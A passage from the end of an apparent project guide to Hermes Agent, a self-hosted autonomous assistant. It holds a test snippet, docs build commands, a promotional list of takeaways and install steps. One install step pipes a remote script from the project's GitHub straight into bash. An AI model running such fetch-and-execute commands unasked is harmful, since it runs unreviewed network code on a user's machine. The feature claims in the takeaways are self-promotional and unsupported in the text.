    response = await runner.handle_message(message)
    
    assert "response" in response
    await runner.stop()
```

### **Documentation**

**Building Docs:**

```bash
cd website
npm install
npm run build
npm run serve
```

**Docs are built with Docusaurus and hosted at:**
<https://hermes-agent.nousresearch.com/docs>

---

## **Conclusion**

Hermes Agent represents a fundamental shift in how we interact with AI. It's not just a chatbot-it's a **persistent, self-improving, autonomous assistant** that lives on your infrastructure and operates across your digital life.

**Key Takeaways:**

1. **Privacy First:** Your data stays on your infrastructure
2. **Always Available:** 24/7 operation across 27+ platforms
3. **Self-Improving:** Learns from experience through skills
4. **Extensible:** 73+ tools, 90+ skills, unlimited custom integrations
5. **Cost-Effective:** Free models available, local operation possible
6. **Secure:** Built-in safety features, isolation options
7. **Open Source:** MIT license, community-driven development

**Getting Started:**

```bash
# Install
curl -fsSL https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.sh | bash

# Setup
hermes setup

# Connect Telegram
hermes gateway setup

# Start chatting
hermes chat
```

---

**Resources:**

- **Documentation:** [https://hermes-agent.nousresearch.com/docs](https://hermes-agent.nousresearch.com/docs)
- **GitHub:** [https://github.com/NousResearch/hermes-agent](https://github.com/NousResearch/hermes-agent)
- **Discord:** [https://discord.gg/nousresearch](https://discord.gg/nousresearch)
- **Hugging Face:** [https://huggingface.co/NousResearch](https://huggingface.co/NousResearch)
- **Skills Hub:** [https://hermes-skills.nousresearch.com](https://hermes-skills.nousresearch.com)
